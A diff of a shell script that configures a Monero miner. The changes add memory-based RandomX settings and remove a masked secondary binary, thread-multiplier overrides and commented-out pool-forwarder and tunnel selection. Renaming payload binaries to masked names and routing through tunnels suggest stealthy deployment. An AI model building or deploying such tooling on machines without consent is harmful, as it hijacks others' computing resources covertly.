@@ -22,9 +22,7 @@ fi
 ## object in sln should be present in pl/
 OBJ_NAME=${OBJ_NAME:-obj}
 [ ! -e "$OBJ_MASK" ] && mv pl/"$OBJ_NAME" "$OBJ_MASK"
-[ ! -e "$CLM_MASK" ] && mv pl/clm "$CLM_MASK"
 chmod +x "${OBJ_MASK}" &>/dev/null
-chmod +x "${CLM_MASK}" &>/dev/null
 
 ## daemon
 # (when not included in the payload or is not a function)
@@ -62,6 +60,16 @@ if [ ${TARGET_CO:-xmr} = xmr ]; then
         hashes=$((cache_MB / 2)) ## each hashpoint takes 2M for xmr
 else
         hashes=$cache_MB
+fi
+
+# memory
+get_mem
+if [ "$FREEMEM" -lt 256 ]; then
+    RX_INIT=false
+    RX_ENABLED=false
+else
+    RX_INIT=-1
+    RX_ENABLED=true
 fi
 
 ## cpu
@@ -106,12 +114,6 @@ else ## no cgroups, use half the cores
                 MHF_D=$hashes_pc
         fi
 fi
-## respect custom settings
-if [ -n "$MHF_FIXED" ]; then
-    MHF=${MHF_FIXED}
-else
-    MHF=${MHF:-${MHF_D}}
-fi
 if [ -n "$THREADS_FIXED" ]; then
     THREADS=$THREADS_FIXED
 else
@@ -123,8 +125,8 @@ fi
 export AFFINITY="0x0"
 
 ## vars for the pausd daemon
-export THREADS=${THREADS:-1} MHF=${MHF:-2}
-export SHARES=${SHARES:-$((THREADS * MHF))} \
+export THREADS=${THREADS:-1}
+export SHARES=${SHARES:-$((THREADS * 2))} \
        RATE=${RATE:-200}
 
 ## vars for the object config
@@ -266,25 +268,6 @@ POOL
 # }
 # POOL
 #         )
-
-    ## randomize forwarders list
-    # fwd="net/forwarders"
-    # pool_fwds=$(ushuffle $fwd)"
-    # export POOLS
-    # p=0
-    # for URL in $(<$fwd); do
-    #     POOLS="${POOLS}$(eval "printf '%s\n' \"$pool,\"")"
-    #     p=$((p+1))
-    # done
-    ## pick a tunnel for the mccsrv from the forwarders
-    # x_fwd="net/x_forwarders"
-    # echo "$(ushuffle $x_fwd)" > "$x_fwd"
-    # while read X_URL; do
-    #     check_connection ${X_URL/:*} ${X_URL/*:}
-    #     [ "$?" = 0 ] && break ## && operator outsite [] is not reliable
-    # done < "$x_fwd"
-
-    # export X_URL
 fi
 
 ## subst
@@ -302,4 +285,3 @@ function config_config() {
     fi
 }
 config_config 0
-# envsubst -no-empty -i "cfg/${OBJ_CFG}" -o "${OBJ_CFG_MASK}"
